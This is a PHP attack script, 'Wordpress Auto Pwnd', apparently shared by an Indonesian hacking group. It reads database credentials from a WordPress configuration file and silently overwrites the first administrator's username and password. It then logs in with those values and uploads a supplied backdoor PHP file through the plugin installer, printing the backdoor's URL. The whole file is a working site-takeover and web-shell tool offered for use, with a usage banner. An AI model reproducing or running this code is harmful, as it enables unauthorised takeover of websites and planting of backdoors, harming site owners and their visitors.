<?php
/*
	Wordpress Auto Pwnd

	Thanks to : IndoXploit for a bit of concept & functions.
*/
$user_baru = "namauser";
$pass_baru = "namapass";
error_reporting(0);
function lohgin($cek, $web, $userr, $pass){
		$post = array(
					"log" => "$userr",
					"pwd" => "$pass",
					"rememberme" => "forever",
					"wp-submit" => "Log In",
					"redirect_to" => "$web/wp-admin/",
					"testcookie" => "1",
					);
	$ch = curl_init ("$cek");
	curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt ($ch, CURLOPT_POST, 1);
	curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);
	curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
	curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
	$data6 = curl_exec ($ch);
	return $data6;
}
function pwnd($url,$user,$pass,$file_upload){
	$site= "$url/wp-login.php";
	$site2= "$url/wp-admin/plugin-install.php?upload";
	$a = lohgin($site, $url, $user, $pass);
	$b = lohgin($site2, $url, $user, $pass);
	$token = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
	$y = date("Y");
	$m = date("m");


  $post2 = array(
					"_wpnonce" => "$token",
					"_wp_http_referer" => "/wp-admin/plugin-install.php",
					"pluginzip" => "@$file_upload",
					"install-plugin-submit" => "Install Now",
					);
	$ch = curl_init ("$url/wp-admin/update.php?action=upload-plugin");
	curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt ($ch, CURLOPT_POST, 1);
	curl_setopt ($ch, CURLOPT_POSTFIELDS, $post2);
	curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
	curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
	if(curl_exec ($ch)){
		echo "[*] Backdoor : $url/wp-content/uploads/$y/$m/".basename($file_upload)."\n\n";
	}
}

function resetPass($user,$pass,$db,$prefix){
	$server    = "localhost";
	$backdoor  = $argv[2];
	global $user_baru,$pass_baru;
/*
	print "select * from ".$prefix."users ORDER BY ID ASC\n";
	print "select * from ".$prefix."options ORDER BY option_id ASC\n";
	print "update ".$prefix."users SET user_login='".$user_baru."',user_pass='".md5($pass_baru)."' where ID='".$id."'\n\n";
*/	

	$con = mysqli_connect($server,$user,$pass,$db);
	mysqli_select_db($con,$db);
	$user_query = mysqli_query($con,"select * from ".$prefix."users ORDER BY ID ASC");
	$view1    	= mysqli_fetch_array($user_query);
	$id 		= $view1['ID'];

	$domain_query = mysqli_query($con,"select * from ".$prefix."options ORDER BY option_id ASC");
	$view2 		  = mysqli_fetch_array($domain_query);
	$dom 		  = $view2['option_value'];

	echo "[*] Target : $dom";
	if(mysqli_query($con,"update ".$prefix."users SET user_login='".$user_baru."',user_pass='".md5($pass_baru)."' where ID='".$id."'")){
		echo "\n[*] New User : $user_baru\n[*] New Pass : $pass_baru\n";
		pwnd($dom,$user_baru,$pass_baru,$backdoor);
		#exit();
	}else{
		echo "\n[*] Failed.\n\n";
	}

}
function ambilKata($param, $kata1, $kata2){
	if(strpos($param, $kata1) === FALSE) return FALSE;
	if(strpos($param, $kata2) === FALSE) return FALSE;
	$start = strpos($param, $kata1) + strlen($kata1);
	$end = strpos($param, $kata2, $start);
	$return = substr($param, $start, $end - $start);
	return $return;
}
if($argv[1] && argv[2]){
$file = file_get_contents($argv[1]);

$user = ambilkata($file,"DB_USER', '","'");
$pass = ambilkata($file,"DB_PASSWORD', '","'");
$db   = ambilkata($file,"DB_NAME', '","'");
$dbprefix = ambilkata($file,"table_prefix  = '","'");


resetPass($user,$pass,$db,$dbprefix);
}else{
echo "
  /////////////////////////// | 
 // WordPress - Auto Pwnd //  | @github : ahmadchen
///////////////////////////   | 
Usage : php wp.php /path/to/config.txt /path/to/backdoor.php
";
}
?>
